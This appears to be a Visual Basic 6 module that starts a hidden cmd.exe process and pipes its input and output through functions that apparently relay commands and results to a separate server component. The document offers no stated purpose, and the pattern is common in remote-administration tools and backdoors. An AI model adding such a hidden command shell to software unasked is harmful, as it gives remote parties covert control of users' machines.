Attribute VB_Name = "Cmd"
Option Explicit

Private Declare Function WriteFile Lib "kernel32" (ByVal hFile As Long, lpBuffer As Any, ByVal nNumberOfBytesToWrite As Long, lpNumberOfBytesWritten As Long, ByVal lpOverlapped As Long) As Long
Private Declare Function DuplicateHandle Lib "kernel32" (ByVal hSourceProcessHandle As Long, ByVal hSourceHandle As Long, ByVal hTargetProcessHandle As Long, lpTargetHandle As Long, ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, ByVal dwOptions As Long) As Long
Private Declare Function GetCurrentProcess Lib "kernel32" () As Long
Private Declare Function CreateProcessA Lib "kernel32" (ByVal lpApplicationName As Long, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, ByVal lpEnvironment As Long, ByVal lpCurrentDirectory As Long, lpStartupInfo As Any, lpProcessInformation As Any) As Long
Private Declare Function CreatePipe Lib "kernel32" (phReadPipe As Long, phWritePipe As Long, lpPipeAttributes As SECURITY_ATTRIBUTES, ByVal nSize As Long) As Long
Private Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long
Private Declare Function ReadFile Lib "kernel32" (ByVal hFile As Long, ByVal lpBuffer As String, ByVal nNumberOfBytesToRead As Long, lpNumberOfBytesRead As Long, ByVal lpOverlapped As Any) As Long
Private Declare Function PeekNamedPipe Lib "kernel32" (ByVal hNamedPipe As Long, lpBuffer As Any, ByVal nBufferSize As Long, lpBytesRead As Long, lpTotalBytesAvail As Long, lpBytesLeftThisMessage As Long) As Long

Private Const DUPLICATE_CLOSE_SOURCE = &H1
Private Const DUPLICATE_SAME_ACCESS = &H2

Private Const STARTF_USESHOWWINDOW = &H1&
Private Const STARTF_USESTDHANDLES = &H100&
Private Const NORMAL_PRIORITY_CLASS = &H20&
' ShowWindow flags
Private Const SW_HIDE = 0

' Error codes
Private Const ERROR_BROKEN_PIPE = 109

'''''''''''''''''
'''   Types   '''
'''''''''''''''''

Private Type SECURITY_ATTRIBUTES
    nLength As Long
    lpSecurityDescriptor As Long
    bInheritHandle As Long
End Type

Private Type STARTUPINFO
    cb As Long
    lpReserved As String
    lpDesktop As String
    lpTitle As String
    dwX As Long
    dwY As Long
    dwXSize As Long
    dwYSize As Long
    dwXCountChars As Long
    dwYCountChars As Long
    dwFillAttribute As Long
    dwFlags As Long
    wShowWindow As Integer
    cbReserved2 As Integer
    lpReserved2 As Long
    hStdInput As Long
    hStdOutput As Long
    hStdError As Long
End Type

Private Type PROCESS_INFORMATION
    hProcess As Long
    hThread As Long
    dwProcessId As Long
    dwThreadId As Long
End Type

Private hReadFile As Long
Private hWritePipe As Long
Private hReadPipe As Long
Private hWriteFile As Long

Public Sub CloseCmdShell()
    On Error Resume Next
    CloseHandle (hReadFile)
    CloseHandle (hWritePipe)
    CloseHandle (hReadPipe)
    CloseHandle (hWriteFile)
End Sub

Public Function ReadCMD() As String
    On Error Resume Next
    Dim dwRead As Long, DesBufSize As Long
    Dim chBuf As String
    Dim buffLen As Long
    buffLen = Server.packageLen \ 2
    If buffLen = 0 Then buffLen = 1
    chBuf = String(buffLen, Chr(0))
    PeekNamedPipe hReadFile, 0, 0, 0, DesBufSize, 0
    If DesBufSize > 0 Then
        ReadFile hReadFile, chBuf, Len(chBuf), dwRead, 0&
        ReadCMD = Left(chBuf, dwRead)
    Else
        ReadCMD = vbNullString
    End If
End Function

Public Function StartCmdProc() As Boolean
    On Error Resume Next
    Dim piProcInfo As PROCESS_INFORMATION
    Dim FsaAttr As SECURITY_ATTRIBUTES
    Dim siStartInfo As STARTUPINFO
    Dim sCmd As String
    Dim Tmp1 As Long, Tmp2 As Long
  
    FsaAttr.nLength = Len(FsaAttr)
    FsaAttr.bInheritHandle = True
    FsaAttr.lpSecurityDescriptor = 0
   
    CreatePipe hReadFile, hWritePipe, FsaAttr, 0
    CreatePipe hReadPipe, hWriteFile, FsaAttr, 0
    
    If DuplicateHandle(GetCurrentProcess(), hReadFile, GetCurrentProcess(), Tmp1, 0, False, 2) > 0 Then
        CloseHandle (hReadFile)
        hReadFile = Tmp1
    End If
    
    If DuplicateHandle(GetCurrentProcess(), hWriteFile, GetCurrentProcess(), Tmp2, 0, False, 2) > 0 Then
        CloseHandle (hWriteFile)
        hWriteFile = Tmp2
    End If

    sCmd = "cmd.exe /D"
    siStartInfo.cb = Len(siStartInfo)
    siStartInfo.hStdInput = hReadPipe
    siStartInfo.hStdOutput = hWritePipe
    siStartInfo.hStdError = hWritePipe
    siStartInfo.dwFlags = STARTF_USESTDHANDLES Or STARTF_USESHOWWINDOW
    siStartInfo.wShowWindow = 0
    StartCmdProc = CreateProcessA(0&, sCmd, FsaAttr, FsaAttr, True, NORMAL_PRIORITY_CLASS, ByVal 0&, 0&, siStartInfo, piProcInfo)
    If StartCmdProc = False Then CloseCmdShell
End Function

Public Sub WriteCMD(ByVal chBuf As String)
    On Error Resume Next
    Dim dwWritten As Long, BufSize As Long
    Dim binput() As Byte

    binput = StrConv(chBuf, vbFromUnicode)
    BufSize = UBound(binput) + 1
    
    WriteFile hWriteFile, binput(0), BufSize, dwWritten, 0&
End Sub

